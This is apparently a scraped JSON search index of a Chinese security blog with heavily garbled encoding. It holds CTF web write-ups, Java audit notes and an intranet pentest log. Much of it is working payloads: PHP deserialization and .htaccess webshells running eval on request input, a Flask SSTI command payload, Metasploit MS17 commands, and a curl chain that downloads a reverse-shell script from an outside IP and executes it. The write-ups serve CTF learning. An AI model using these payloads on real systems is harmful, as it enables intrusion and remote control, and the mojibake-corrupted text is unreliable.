Hard !!&quot;); } } }}if (isset($_GET['great'])){ unserialize($_GET['great']);} else { highlight_file(__FILE__);}?&gt; md5å’Œsha1åŠ å¯†åç›¸ç­‰ï¼Œä½†æ˜¯æœ¬èº«å€¼ä¸ç­‰ï¼Œ è¿™é‡Œå°±è¦æ‹“å®½æ€è·¯ï¼Œæœ¬èº«çš„å€¼å¯ä»¥æ˜¯ä»€ä¹ˆï¼Ÿå½“ç„¶è¿˜å¯ä»¥æ˜¯é”™è¯¯ä¿¡æ¯ä¹‹ç±»çš„ã€‚è€Œè¿™é‡Œä¹Ÿæ˜¯ç”¨åˆ°äº†è¿™ä¸ªphpçš„æŠ¥é”™å†…ç½®ç±»å¯¼è‡´å›æ˜¾ç»“æœç›¸ç­‰ &lt;?php class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\'/&quot;, $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(&quot;Try Hard !!&quot;); } } }} $str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;/* æˆ–ä½¿ç”¨[~(å–å)][!%FF]çš„å½¢å¼ï¼Œå³: $str = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;; $str = &quot;?&gt;&lt;?=include $_GET[_]?&gt;&quot;; */$a=new Error($str,1);$b=new Error($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c))); ?&gt; [XNUCA2019Qualifier]EasyPHPè¿™é‡Œä¸€çœ‹å°±çŸ¥é“æ˜¯è¦ä½¿ç”¨htaccessè¿›è¡Œç»•è¿‡äº†ã€‚ã€‚ã€‚ ä½†æ˜¯å…¶å®è‡ªå·±è¿˜æ²¡åšè¿‡è¿™æ ·çš„é¢˜ï¼Œç§¯ç´¯ä¸€ä¸‹å§¿åŠ¿ åˆ©ç”¨error_logå†™å…¥logæ–‡ä»¶åˆ°/tmp/fl3g.phpï¼Œå†è®¾ç½®include_path=/tmpå³å¯è®©index.phpèƒ½å¤ŸåŒ…å«æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚è¿™é‡Œçš„æŠ¥é”™å¯ä»¥é€šè¿‡è®¾ç½®include_pathåˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶å¤¹å³å¯è§¦å‘åŒ…å«æ—¶çš„æŠ¥é”™ï¼Œä¸”include_pathçš„å€¼ä¹Ÿä¼šè¢«è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚php_value include_path &quot;/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;php_value error_reporting 32767php_value error_log /tmp/fl3g.php# \\ ç›´æ¥å†™å…¥æ‰§è¡Œå‘½ä»¤ php_value auto_prepend_fi\\le &quot;.htaccess&quot;#&lt;?php @eval($_GET['cmd']); ?&gt;\\ å¦‚ä¸ŠæŒ‡ä»¤éœ€è¦ç»è¿‡urlencodeä¸€ä¸‹ filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\\%70%68%70%5f%76%61%6c%75%65%20%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%5c%0a%6c%65%20%22%2e%68%74%61%63%63%65%73%73%22%0a%23%3c%3f%70%68%70%20%65%63%68%6f%20%60%63%61%74%20%66%2a%60%3b%20%3f%3e%5c payload ?filename=.htaccess&amp;content=php_value%20include_path%20%22%2Ftmp%2Fxx%2F%2BADw%3Fphp%20die(eval(%24_GET%5B2%5D))%2BADs%20%2BAF8AXw-halt%2BAF8-compiler()%2BADs%22%0Aphp_value%20error_reporting%2032767%0Aphp_value%20error_log%20%2Ftmp%2Ffl3g.php%0A%23%20%5C éé¢„æœŸè§£ import requests# %23 æ˜¯# çš„urlç¼–ç ï¼Œé˜²æ­¢pythonæŠŠè‡ªå·±æ³¨é‡Šäº†# \\\\ ï¼Œ ä¸¤ä¸ª\\\\ä¸Šä¼ ä¸Šå»å°±æ˜¯ ä¸€ä¸ª \\content = '''php_value auto_prepend_fi\\\\le &quot;.htaccess&quot;%23&lt;?php eval($_POST[cmd]);?&gt;\\\\'''url = &quot;http://203dd3ff-f703-4233-b159-93832d5b93b3.node4.buuoj.cn:81/?filename=.htaccess&amp;content={}&quot;.format(content)res = requests.get(url=url)print(res.url)print(res.text)","link":"/2022/03/12/buu%E5%88%B7%E9%A2%98/"},{"title":"buuåˆ·é¢˜2","text":"EasyBypass?comm1=index.php&quot;;m4 /fla?;&quot;&amp;comm2=1?comm1=index.php&quot;;tac/fla?;&quot;&amp;comm2=1 [pasecactf_2019]flask_ssti{{config[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;)[&quot;read&quot;]()}} ç”±äºæ–‡ä»¶ä¹‹å‰æ˜¯æœ‰è¢«æ‰“å¼€è¿‡çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨è¯»å–prodæ¥è¯»å– /proc/self/fd/3 [å®‰æ´µæ¯ 2019]iamthinkingparse_urlç”¨///public/?payload=æ¥ç»•è¿‡ [CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1","link":"/2022/03/13/buu%E5%88%B7%E9%A2%982/"},{"title":"classLoaderç±»åŠ è½½æœºåˆ¶","text":"ClassLoaderç±»åŠ è½½æœºåˆ¶åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå¹¶ä¸ä¼šä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰çš„classæ–‡ä»¶è¿›å…¥å†…å­˜ï¼Œè€Œæ˜¯é€šè¿‡javaçš„ç±»åŠ è½½æœºåˆ¶ï¼ˆClassLoaderï¼‰è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œä»è€Œè½¬åŒ–æˆjava.lang.Classç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚ ClassLoaderç±»é€šè¿‡æŒ‡å®šçš„ç±»çš„åç§°ï¼Œæ‰¾åˆ°æˆ–ç”Ÿæˆå¯¹åº”çš„å­—èŠ‚ç ï¼Œè¿”å›ä¸€ä¸ªjava.lang.Classçš„å®ä¾‹ã€‚å¼€å‘è€…å¯ä»¥é€šè¿‡ç»§æ‰¿ClassLoaderç±»æ¥å®ç°è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ã€‚ ClassLoaderç±»ä¸­å’ŒåŠ è½½ç±»ç›¸å…³çš„æ–¹æ³•1.getparent()ï¼šè¿”å›è¯¥ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨ 2.loadClass(String name)ï¼šåŠ è½½åç§°ä¸ºnameçš„ç±»ï¼Œè¿”å›çš„ç»“æœæ˜¯java.lang.Classç±»çš„å®ä¾‹ 3.findClass(String name)ï¼šæŸ¥æ‰¾åç§°ä¸ºnameçš„ç±»ï¼Œè¿”å›çš„ç»“æœæ˜¯java.lang.Classç±»çš„å®ä¾‹ 4.findLoadedClass(String name)ï¼šæŸ¥æ‰¾åç§°ä¸ºnameçš„å·²ç»è¢«åŠ è½½è¿‡çš„ç±»ï¼Œè¿”å›çš„ç»“æœæ˜¯java.lang.Classç±»çš„å®ä¾‹ 5.defineClass(String name, bytep[] b,int off,int len)ï¼šæŠŠå­—èŠ‚æ•°ç»„bä¸­çš„å†…å®¹è½¬æ¢æˆjavaç±»ï¼Œè¿”å›çš„ç»“æœæ˜¯java.lang.Classç±»çš„å®ä¾‹ï¼Œè¯¥æ–¹æ³•è¢«å£°æ˜ä¸ºfinal 6.resolveClass(Class&lt;?&gt; c) ï¼šé“¾æ¥æŒ‡å®šçš„javaç±» æµç¨‹1.å½“loadClassæ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œä¼šé¦–å…ˆä½¿ç”¨findLoadedClass()æ–¹æ³•åˆ¤æ–­è¯¥ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½ã€‚ 2.è‹¥æœªè¢«åŠ è½½ï¼Œåˆ™ä¼˜å…ˆä½¿ç”¨åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ 3.è‹¥ä¸å­˜åœ¨çˆ¶ç±»åŠ è½½å™¨ï¼Œæ— æ³•å¯¹è¯¥ç±»è¿›è¡ŒåŠ è½½æ—¶ï¼Œå°±è°ƒç”¨è‡ªèº«çš„findClass()æ–¹æ³•ã€‚ å› æ­¤å¯ä»¥é‡å†™findClass()æ¥å®Œæˆä¸€äº›ç±»åŠ è½½çš„ç‰¹æ®Šè¦æ±‚ã€‚ URLClassLoaderç±»å¯ä»¥ä»è¿œç¨‹æœåŠ¡å™¨ä¸ŠåŠ è½½ç±»çš„èƒ½åŠ› javaåŠ¨æ€ä»£ç†åŠ¨æ€ä»£ç†å®è´¨æ˜¯åå°„","link":"/2022/02/24/classLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"},{"title":"javaå®¡è®¡-javaconåˆ†æ","text":"å‰è¨€åœ¨å‰é¢åšäº†é‚£ä¹ˆå¤šç¯å¢ƒæ­å»ºä»¥åï¼Œå…¶ä¸­çš„æ¼æ´éš¾åº¦åˆ©ç”¨å…¶å®ä¸é«˜ï¼Œæˆ‘æ„Ÿè§‰javaçš„éš¾ç‚¹åº”è¯¥è¿˜æ˜¯åœ¨åå°„ã€ååºåˆ—åŒ–ä¹‹ç±»çš„åœ°æ–¹ï¼Œäºæ˜¯å›æ¥é‡æ–°åšä¸€ä¸‹ ç¯å¢ƒæ­å»ºå¯¹jarè¿›è¡Œè§£å‹ï¼Œç„¶åä½¿ç”¨ideaæ‰“å¼€ï¼Œé…ç½®ä¸€ä¸‹è¿œç¨‹ï¼Œå¤åˆ¶ä»£ç  ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤è¿è¡ŒjaråŒ… java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 -jar challenge-0.0.1-SNAPSHOT.jar","link":"/2022/02/27/java%E5%AE%A1%E8%AE%A1-javacon%E5%88%86%E6%9E%90/"},{"title":"javaå®¡è®¡å…¥é—¨ï¼ˆä¸€ï¼‰","text":"å†™åœ¨å‰é¢è¿™å‡ å¤©ä¸€ç›´é™†é™†ç»­ç»­åœ¨å­¦javaçš„ä»£ç å®¡è®¡ï¼Œä½†æ˜¯æ€»æ„Ÿè§‰å­¦çš„ä¸æ˜¯å¾ˆé¡ºç•…ï¼Œæ‰€ä»¥å»ã€Šä»£ç å®¡è®¡ã€‹æ˜Ÿçƒçœ‹äº†ä¸€ä¸ªå…¥é—¨çš„pandaå¸ˆå‚…å†™çš„javaå®¡è®¡ï¼Œä¸€å¼€å§‹çš„åŸºç¡€çŸ¥è¯†å°±è·Ÿç€æ‰“ä¸€éå§ åŸºç¡€çŸ¥è¯†1.åŒ…çš„å‘½åè§„èŒƒï¼ˆ1ï¼‰indi: ä¸ªä½“é¡¹ç›®ï¼šæŒ‡ä¸ªäººå‘èµ·ï¼Œä½†éè‡ªå·±ç‹¬ç«‹å®Œæˆçš„é¡¹ç›®ï¼Œå¯å…¬å¼€æˆ–ç§æœ‰é¡¹ç›®ï¼Œcopyrightä¸»è¦å±äºå‘èµ·è€…åŒ…åä¸º:indi.å‘èµ·è€…å.é¡¹ç›®å.æ¨¡å—å.ã€‚ã€‚ã€‚ ï¼ˆ2ï¼‰pers: ä¸ªäººé¡¹ç›®:æŒ‡ä¸ªäººå‘èµ·ï¼Œç‹¬è‡ªå®Œæˆï¼Œå¯åˆ†äº«çš„é¡¹ç›®ï¼Œcopyrightä¸»è¦å±äºä¸ªäººã€‚åŒ…åä¸ºpers.ä¸ªäººå.é¡¹ç›®å.æ¨¡å—å.ã€‚ã€‚ã€‚ (3)priv: ç§æœ‰é¡¹ç›®:æŒ‡ä¸ªäººå‘èµ·ï¼Œç‹¬ç«‹å®Œæˆï¼Œéå…¬å¼€çš„ç§äººä½¿ç”¨çš„é¡¹ç›®ï¼Œcopyrightå±äºä¸ªäººåŒ…åä¸ºpriv.ä¸ªäººå.é¡¹ç›®å.æ¨¡å—å.ã€‚ã€‚ã€‚ ï¼ˆ4ï¼‰onem: ä¸indi ç›¸åŒï¼Œæ¨èä½¿ç”¨indi ï¼ˆ5ï¼‰team: å›¢é˜Ÿé¡¹ç›®ï¼ŒæŒ‡ç”±å›¢é˜Ÿå‘èµ·ï¼Œå¹¶ç”±è¯¥å›¢é˜Ÿå¼€å‘çš„é¡¹ç›®ï¼Œcopyrightå±äºè¯¥å›¢é˜Ÿæ‰€æœ‰åŒ…åä¸º:team.å›¢é˜Ÿå.é¡¹ç›®å.æ¨¡å—å.ã€‚ã€‚ã€‚ ï¼ˆ6ï¼‰comï¼š å…¬å¸é¡¹ç›®ï¼Œcopyrightç”±é¡¹ç›®å‘èµ·çš„å…¬å¸æ‰€æœ‰åŒ…åä¸º:com.å…¬å¸å.é¡¹ç›®å.æ¨¡å—å.ã€‚ã€‚ã€‚ æŒä¹…å±‚ï¼šdaoã€persistã€mapperå®ä½“ç±»ï¼šentityã€modelã€beanã€javabeanã€pojoä¸šåŠ¡é€»è¾‘ï¼šserviceã€bizæ§åˆ¶å™¨ï¼šcontrollerã€servletã€actionã€webè¿‡æ»¤å™¨ï¼šfilterå¼‚å¸¸ï¼šexceptionç›‘å¬å™¨ï¼šlisteneråœ¨ä¸åŒçš„æ¡†æ¶ä¸‹ä¸€ç­åŒ…çš„å‘½åè§„åˆ™ä¸åŒï¼Œä½†å¤§æ¦‚å¦‚ä¸Šï¼Œä¸åŒåŠŸèƒ½çš„javaæ–‡ä»¶æ”¾åœ¨ä¸åŒçš„åŒ…ä¸­ï¼Œæ ¹æ®javaæ–‡ä»¶çš„åŠŸèƒ½ç»Ÿä¸€å®‰æ”¾åŠå‘½åã€‚ 2.servletä»€ä¹ˆæ˜¯servletï¼Ÿjava Servletæ˜¯è¿è¡Œåœ¨webæœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ªwebæµè§ˆå™¨æˆ–å…¶ä»–HTTPå®¢æˆ·ç«¯çš„è¯·æ±‚å’ŒHTTPæœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚ Servletæ‰§è¡Œä»¥ä¸‹ä»»åŠ¡ï¼š è¯»å–å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰å‘é€çš„æ˜¾ç¤ºçš„æ•°æ®ï¼ŒåŒ…æ‹¬ç½‘é¡µä¸Šçš„HTMLè¡¨å•ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥æ˜¯æ¥è‡ªappletæˆ–è‡ªå®šä¹‰çš„HTTPå®¢æˆ·ç«¯ç¨‹åºçš„è¡¨å•ã€‚ è¯»å–å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰å‘é€çš„éšå¼çš„HTTPè¯·æ±‚æ•°æ®ã€‚è¿™åŒ…æ‹¬cookiesã€åª’ä½“ç±»å‹å’Œæµè§ˆå™¨èƒ½ç†è§£çš„å‹ç¼©æ ¼å¼ç­‰ å¤„ç†æ•°æ®å¹¶ç”Ÿæˆç»“æœï¼Œè¿™ä¸ªè¿‡ç¨‹å¯èƒ½éœ€è¦è®¿é—®æ•°æ®åº“ï¼Œæ‰§è¡ŒRMIæˆ–CORBAè°ƒç”¨ï¼Œè°ƒç”¨webæœåŠ¡ï¼Œæˆ–è€…ç›´æ¥è®¡ç®—å¾—å‡ºå¯¹åº”çš„å“åº”ã€‚ å‘é€æ˜¾ç¤ºçš„æ•°æ®ï¼ˆå³æ–‡æ¡£ï¼‰åˆ°å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ã€‚è¯¥æ–‡æ¡£çš„æ ¼å¼å¯ä»¥æ˜¯å¤šç§å¤šæ ·çš„ï¼ŒåŒ…æ‹¬æ–‡æœ¬æ–‡ä»¶ï¼ˆhtmlæˆ–xmlï¼‰ã€äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆGIFå›¾åƒï¼‰ã€excelç­‰ã€‚ å‘é€éšå¼çš„httpå“åº”åˆ°å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ã€‚è¿™åŒ…æ‹¬å‘Šè¯‰æµè§ˆå™¨æˆ–å…¶ä»–å®¢æˆ·ç«¯è¢«è¿”å›çš„æ–‡æ¡£ç±»å‹ï¼ˆå¦‚htmlï¼‰ï¼Œè®¾ç½®cookieså’Œç¼“å­˜å‚æ•°ï¼Œä»¥åŠå…¶ä»–ç±»ä¼¼çš„ä»»åŠ¡ã€‚ Servlet ç”Ÿå‘½å‘¨æœŸServlet ç”Ÿå‘½å‘¨æœŸå¯è¢«å®šä¹‰ä¸ºä»åˆ›å»ºç›´åˆ°æ¯ç­çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ä»¥ä¸‹æ˜¯ Servlet éµå¾ªçš„è¿‡ç¨‹ï¼š Servlet é€šè¿‡è°ƒç”¨ init () æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ã€‚ Servlet è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚ Servlet é€šè¿‡è°ƒç”¨ destroy() æ–¹æ³•ç»ˆæ­¢ï¼ˆç»“æŸï¼‰ã€‚ æœ€åï¼ŒServlet æ˜¯ç”± JVM çš„åƒåœ¾å›æ”¶å™¨è¿›è¡Œåƒåœ¾å›æ”¶çš„ã€‚ è¿™é‡Œä¸»è¦ä»‹ç»ä¸€ä¸‹service() æ–¹æ³•ã€‚ service() æ–¹æ³•æ˜¯æ‰§è¡Œå®é™…ä»»åŠ¡çš„ä¸»è¦æ–¹æ³•ï¼ŒServlet å®¹å™¨ï¼ˆå³ Web æœåŠ¡å™¨ï¼‰è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰çš„è¯·æ±‚ï¼Œå¹¶æŠŠæ ¼å¼åŒ–çš„å“åº”å†™å›ç»™å®¢æˆ·ç«¯ã€‚æ¯æ¬¡æœåŠ¡å™¨æ¥æ”¶åˆ°ä¸€ä¸ª Servlet è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„çº¿ç¨‹å¹¶è°ƒç”¨æœåŠ¡ã€‚service() æ–¹æ³•æ£€æŸ¥ HTTP è¯·æ±‚ç±»å‹ï¼ˆGETã€POSTã€PUTã€DELETE ç­‰ï¼‰ï¼Œå¹¶åœ¨é€‚å½“çš„æ—¶å€™è°ƒç”¨ doGetã€doPostã€doPutï¼ŒdoDelete ç­‰æ–¹æ³•ã€‚ public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException{ ...} ä»¥ä¸Šä»£ç ï¼Œå³ä¸ºä¸€ä¸ªservice()æ–¹æ³•çš„ç‰¹å¾","link":"/2022/03/14/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"webå‰ç«¯å¼€å‘","text":"","link":"/2022/02/27/web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"},{"title":"ä½¿ç”¨javaè¿›è¡Œè¿œç¨‹dockerå®¹å™¨debug","text":"é¦–å…ˆä»dockerä¸­å°†å¯åŠ¨çš„jaråŒ…æ‰“åŒ…å‡ºæ¥ docker cp 7d:/opt/solr/server/start.jar D:\\javaprogram\\log4j2","link":"/2022/03/14/%E4%BD%BF%E7%94%A8java%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8Bdocker%E5%AE%B9%E5%99%A8debug/"},{"title":"è®°ä¸€æ¬¡å†…ç½‘æ¸—é€","text":"å†å­¦é•¿ä»¬æ¸—é€é…ç½®å¥½frpä»¥åï¼Œæ¥ä¸‹æ¥çš„æ“ä½œè®°å½• PSï¼šåœ¨å¯¹å†…ç½‘è¿›è¡Œæ”»å‡»æ—¶ï¼Œéƒ½éœ€è¦ä½¿ç”¨proxychainsé…ç½®ä¸€ä¸‹ä»£ç† proxychainsé…ç½®ä½œç”¨vi /etc/proxychains4.conf é…ç½®äº†proxychainsä»¥åå¯ä»¥å°†ç«¯å£è½¬å‘è¿›å†…ç½‘ ä½¿ç”¨proxychainsé…ç½®ä¸€ä¸‹ socks5 xxxx.xxx.xxx.xxx port ç„¶åä½¿ç”¨ä»£ç†è¿›å…¥æ‰§è¡Œå‘½ä»¤ msfæŒ‡ä»¤search smb_version #æœç´¢æ¨¡å—use 0#é€‰æ‹©0å·æ¨¡å—set RHOSTS XXX.XXX.XXX.XXX #è®¾ç½®è®¿é—®å†…ç½‘ä¸»æœºipsearch ms17#æŸ¥çœ‹ms17æ¨¡å—èƒ½æ‰§è¡Œä»€ä¹ˆå‘½ä»¤use 5#ä½¿ç”¨5å·åŠŸèƒ½show options#æ˜¾ç¤º æ¨¡å—çš„optionsèƒ½æ‰§è¡Œä»€ä¹ˆset RHOSTS XXX.XXX.XXX.XXX #è®¾ç½®ç›®æ ‡ä¸»æœºset COMMAND whoamiæ‰§è¡Œå‘½ä»¤","link":"/2022/03/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"title":"2022DASCTF_3","text":"å‰è¨€è¿™å‡ å¤©éƒ½åœ¨æŠ¤ç½‘ï¼Œæ­£å¥½æœ‰æ¯”èµ›ï¼Œæ‰“çš„ç´¯çš„æ—¶å€™å°±æ¥çœ‹çœ‹é¢˜è½¬æ¢ä¸€ä¸‹å¿ƒæƒ… ezpopç®€å•çš„popé“¾ï¼Œåé¢è®°å¾—è¦†ç›–ä¸€ä¸‹å°±å¥½ &lt;?phpclass fin{ public $f1;}class what{ public $a;}class mix{ public $m1;}class crow{ public $v1; public $v2;}$a=new fin();$b=new what();$c=new mix();$d=new crow();$e=new fin();$f=new mix();$e-&gt;f1=$f;$f-&gt;m1=&quot;\\n system('curl xx');&quot;;$d-&gt;v1=$e;$c-&gt;m1=$d;$b-&gt;a=$c;$a-&gt;f1=$b;$h=serialize($a);echo urlencode($h); calcpythonçš„ï¼Œå¾ˆå°‘åšæ‰“pythonçš„é¢˜ç›®ï¼Œæ‰€ä»¥å¾ˆå¤šå§¿åŠ¿éƒ½ä¸æ˜¯å¾ˆæ¸…æ¥š 1.importå¯¼å…¥ç±»å¹¶ç»§æ‰¿åŠ è½½è¿™ä¹Ÿæ˜¯æœç´¢å‡ºæ¥æ¯”è¾ƒå¤šçš„æ–¹æ³•ï¼Œä½†æ˜¯ä»–æŠŠå¾ˆå¤šä¸œè¥¿éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•ä¸å¤ªè¡Œ 'import','(',')',' ','_','|',';','&quot;','{','}','&amp;','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__' 2.éé¢„æœŸè¿™é‡Œå…ˆç§¯ç´¯ä¸€ä¸ªéé¢„æœŸå§ï¼Œè¿™ä¸ªåœ°æ–¹çš„æ€è·¯ä¹ŸæŒºå·§å¦™çš„ data = eval(&quot;7*7#`curl http://11xxx:9999`&quot;)os.system(log) åˆ©ç”¨çš„æ˜¯ä¸¤ç§è¯­è¨€åŠ è½½ä¸€æ ·çš„ç‰¹æ€§ï¼ŒevalåŠ è½½çš„æ˜¯pythonçš„è¯­è¨€ï¼Œè€Œsystemä½¿ç”¨çš„æ˜¯shellè¯­è¨€ç‰¹æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè®©evalæ‰§è¡Œ7*7å¹¶å…ˆæ³¨é‡Šæ‰åé¢çš„å†…å®¹ï¼Œç„¶åä½¿ç”¨systemå»æ‰§è¡Œåå¼•å·å†…çš„ç³»ç»Ÿå‘½ä»¤,é‚£ä¹ˆè¿™å°±æ„å‘³ç€ï¼Œæˆ‘ä»¬æ­¤æ—¶å¾—åˆ°äº†ä¸€ä¸ªæ— å›æ˜¾çš„shell echo {0} {1} &quot;7*7#`xxxxx`&quot;&gt; ./tmp/log.txt æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æ˜¯curlå‘½ä»¤ä¸‹è½½ä¸€ä¸ªåå¼¹shellçš„shæ–‡ä»¶åˆ°tmpç›®å½•ä¸‹ï¼Œå¹¶æ‰§è¡Œè¿™ä¸ªshæ–‡ä»¶å°±è¡Œäº† 7*7%23`curl%09http://110.42.1/aa&gt;/tmp/a` 7*7%23`chmod%09777%09/tmp/a` `/tmp/a` å°ç»“æ„Ÿè§‰åšè¿™é¢˜çš„æ—¶å€™ï¼Œæ€ç»´æœ‰ç‚¹è¢«ç¦é”¢ä½äº†ï¼Œå…¶å®çœ‹åˆ°ä¸€ä¸ªevalå’Œä¸€ä¸ªsystemçš„æ—¶å€™ï¼Œå°±è¦æƒ³åˆ°è¯­è¨€çš„å·®å¼‚æ€§å¾€å¾€ä¹Ÿæ˜¯å¼•èµ·æ¼æ´çš„å¼€å§‹ upgdstoreå¯ä»¥ä¼ phpinfo()ï¼Œä½†æ˜¯è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦å…ˆæ‹¿åˆ°ä»–çš„æºç æ‰è¡Œï¼Œå‘ç°è¿‡æ»¤äº†fileå…³é”®å­—ï¼Œå¯ä»¥é‡‡å–æ‹¼æ¥çš„æ–¹å¼è¿›è¡Œç»•è¿‡ &lt;?php echo ('fil'.'e_get_contents')('/var/www/html/index.php'); æ‹¿åˆ°æºç  &lt;?phpfunction fun($var): bool{ $blacklist = [&quot;\\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;`&quot;,&quot;chmod&quot;]; foreach($blacklist as $blackword){ if(strstr($var, $blackword)) return True; } return False;}error_reporting(0);//è®¾ç½®ä¸Šä¼ ç›®å½•define(&quot;UPLOAD_PATH&quot;, &quot;./uploads&quot;);$msg = &quot;Upload Success!&quot;;if (isset($_POST['submit'])) {$temp_file = $_FILES['upload_file']['tmp_name'];$file_name = $_FILES['upload_file']['name'];$ext = pathinfo($file_name,PATHINFO_EXTENSION);if(!preg_match(&quot;/php/i&quot;, strtolower($ext))){die(&quot;åªè¦å¥½çœ‹çš„php&quot;);}$content = file_get_contents($temp_file);if(fun($content)){ die(&quot;è¯¶ï¼Œè¢«æˆ‘å‘ç°äº†å§&quot;);}$new_file_name = md5($file_name).&quot;.&quot;.$ext; $img_path = UPLOAD_PATH . '/' . $new_file_name; if (move_uploaded_file($temp_file, $img_path)){ $is_upload = true; } else { $msg = 'Upload Failed!'; die(); } å‘ç°ç¡®å®è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨å¯ä»¥é€šè¿‡æ‹¼æ¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘å¦‚ä½•å†™å…¥webshell äº†,ç›´æ¥è´´ä¸€ä¸‹å¤§å¸ˆå‚…çš„æ–‡ç« ï¼Œåˆ©ç”¨çš„æ˜¯å†…ç½®ç±»SplFileObject::fwriteå†™å…¥å†…å®¹ï¼Œå¹¶ä¸”ä½¿ç”¨defineå®šä¹‰å¸¸é‡å°†å…¶å†™å…¥æ–‡ä»¶ä¸­ï¼Œæ²¡è§è¿‡çš„å§¿åŠ¿ï¼Œå­¦ä¹ äº† &lt;?phpdefine(&quot;EV&quot;, &quot;eva&quot;.&quot;l&quot;);define(&quot;GETCONT&quot;, &quot;fil&quot;.&quot;e_get_contents&quot;);// ç”±äºç¦æ­¢äº†$ï¼Œæˆ‘ä»¬åªèƒ½ä»å·²æœ‰çš„åœ°æ–¹è·å–$ç¬¦define(&quot;D&quot;,(GETCONT)('/var/www/html/index.php')[353]);define(&quot;SHELL&quot;,&quot;&lt;?php 